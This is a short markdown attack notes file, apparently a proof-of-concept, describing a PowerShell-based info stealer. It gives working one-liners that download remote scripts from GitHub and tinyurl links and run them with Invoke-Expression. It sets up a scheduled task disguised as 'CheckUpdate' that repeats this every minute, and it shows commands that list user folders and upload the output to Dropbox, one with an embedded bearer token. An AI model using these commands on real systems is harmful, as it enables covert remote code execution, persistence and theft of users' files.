# Info Stealing via PowerShell command

## ByPass PowerShell restriction

Using "run" application to run powershell command inline:

    - powershell Write-Host "Test"; Start-Sleep -Seconds 1
    - powershell $rawcmd = Invoke-webrequest -URI https://raw.githubusercontent.com/roccosicilia/my-papers/main/poc-c2/infosteal-ps/cmd-demo.txt; Invoke-Expression $rawcmd;
    - powershell $rawcmd = Invoke-webrequest -URI https://tinyurl.com/3v7pdjj9; Invoke-Expression $rawcmd;
    - powershell $rawcmd = Invoke-webrequest -URI https://tinyurl.com/3v7pdjj9 -UseBasicParsing; Invoke-Expression $rawcmd;

## Set a Scheduled Task

$a = New-ScheduledTaskAction -Execute 'powershell' -Argument '$rawcmd = Invoke-webrequest -URI {PASTEBIN} -UseBasicParsing; Invoke-Expression $rawcmd;'
$t = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -Action $a -Trigger $t -TaskPath "CheckUpdate" -TaskName "CheckUpdate" -Description "Check for new software update."

## Command Example in PasteBin

 - directory listing in output file

& dir c:\Users\Public > c:\Users\Public\out.txt; 
& dir $HOME\Desktop > c:\Users\Public\out.txt;

 - send output to DropBox

$destFile = "/$(get-date -f yyyyMMddHHmm)_outfile.txt"; $rargs = '{ "path": "' + $destFile + '", "mode": "add", "autorename": true, "mute": false }'; $auth = "Bearer sl.BeAsjRFNn8U3eFHQAsq8OVKks5ISflHUPEOd6SPmGaDqWhhIw_GTwQ55aBPk5MKYmK5uPJtyzya3phr2YGCMx4kftQTMbgCTLnLILfpg39G3BVPYNppRSP7pne8kjwKfLP9dj4aPxL93"; $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"; $headers.Add("Authorization", $auth); $headers.Add("Dropbox-API-Arg", $rargs); $headers.Add("Content-Type", 'application/octet-stream'); Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile "c:\Users\Public\out.txt" -Headers $headers

$destFile = "/$(get-date -f yyyyMMddHHmm)_outfile.txt"; $rargs = '{ "path": "' + $destFile + '", "mode": "add", "autorename": true, "mute": false }'; $auth = "Bearer **TOKEN**"; $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"; $headers.Add("Authorization", $auth); $headers.Add("Dropbox-API-Arg", $rargs); $headers.Add("Content-Type", 'application/octet-stream'); Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile "**PATH TO FILE**" -Headers $headers


$destFile = "/$(get-date -f yyyyMMddHHmm)_outfile.txt";
$rargs = '{ "path": "' + $destFile + '", "mode": "add", "autorename": true, "mute": false }';
$auth = "Bearer **TOKEN**";
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"; $headers.Add("Authorization", $auth); $headers.Add("Dropbox-API-Arg", $rargs); $headers.Add("Content-Type", 'application/octet-stream');

Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile "c:\Users\Public\out.txt" -Headers $headers

